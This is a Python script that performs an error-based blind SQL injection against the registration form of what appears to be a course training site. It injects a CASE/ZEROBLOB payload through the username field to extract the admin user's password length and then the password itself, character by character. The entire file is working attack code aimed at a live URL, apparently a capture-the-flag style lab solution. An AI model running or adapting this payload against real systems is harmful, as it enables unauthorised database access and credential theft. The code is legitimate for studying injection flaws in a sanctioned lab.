import requests
import string

url = "https://sql-injection-medium.is-course.ru/register"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

# Characters to test (adjust as needed)
chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?/~`"

def test_condition(condition):
    """Test a boolean condition. Returns True if error occurs."""
    data = {
        "username": f"test'||(SELECT CASE WHEN ({condition}) THEN ZEROBLOB(1000000000) ELSE 1 END)||'",
        "email": f"test{condition[:10]}@test.com",  # Unique email to avoid constraint issues
        "password": "test123"
    }
    
    try:
        response = requests.post(url, headers=headers, data=data)
        response_text = response.text.lower()
        
        # Check for error indicators
        if "string or blob too big" in response_text or "unique constraint failed" in response_text:
            return True
        return False
    except Exception as e:
        print(f"Request error: {e}")
        return False

def get_password_length():
    """Determine password length using binary search."""
    print("[*] Finding password length...")
    
    # First, find upper bound
    max_len = 100
    for i in range(1, max_len):
        condition = f"(SELECT LENGTH(password) FROM users WHERE username='admin')={i}"
        if test_condition(condition):
            print(f"[+] Password length: {i}")
            return i
    
    # Binary search if needed
    low, high = 1, max_len
    while low <= high:
        mid = (low + high) // 2
        condition = f"(SELECT LENGTH(password) FROM users WHERE username='admin')<={mid}"
        if test_condition(condition):
            high = mid - 1
        else:
            low = mid + 1
    
    print(f"[+] Password length: {low}")
    return low

def extract_password(length):
    """Extract password character by character."""
    password = ""
    
    for position in range(1, length + 1):
        found = False
        
        for char in chars:
            # Escape single quotes for SQL
            escaped_char = char.replace("'", "''")
            
            condition = f"(SELECT SUBSTR(password,{position},1) FROM users WHERE username='admin')='{escaped_char}'"
            
            print(f"[*] Testing position {position}, char '{char}'...", end=" ")
            
            if test_condition(condition):
                password += char
                print(f"MATCH! Current password: {password}")
                found = True
                break
            else:
                print("no")
        
        if not found:
            print(f"[!] Character at position {position} not found in charset")
            password += "?"
    
    return password

def main():
    print("[*] Starting Boolean-Based Blind SQL Injection")
    print("[*] Target:", url)
    print()
    
    # Test connection
    print("[*] Testing connection...")
    test_data = {
        "username": "test_connection",
        "email": "test_connection@test.com",
        "password": "test123"
    }
    
    try:
        response = requests.post(url, headers=headers, data=test_data)
        print(f"[+] Server response: {response.status_code}")
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return
    
    # Extract password
    try:
        length = get_password_length()
        if length == 0:
            print("[-] Could not determine password length")
            return
        
        print(f"\n[*] Extracting {length} character password...")
        password = extract_password(length)
        
        print(f"\n[+] EXTRACTED PASSWORD: {password}")
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()
